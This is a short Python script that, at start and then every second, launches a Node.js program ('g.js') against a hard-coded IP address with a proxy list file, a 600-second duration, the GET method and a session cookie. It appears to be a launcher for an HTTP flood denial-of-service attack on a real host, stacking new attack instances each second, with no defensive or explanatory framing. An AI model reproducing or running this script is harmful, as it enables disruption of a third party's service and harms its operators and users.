import schedule
import time
import os
import sys

os.system('node g.js http://144.202.6.153 http.txt 600 GET PHPSESSID:r3tdru4l6rpknj7leo45tlivhj')

def job():
    os.system('node g.js http://144.202.6.153 http.txt 600 GET PHPSESSID:r3tdru4l6rpknj7leo45tlivhj')
    
schedule.every(1).seconds.do(job)

while True:
    schedule.run_pending()
    time.sleep(1)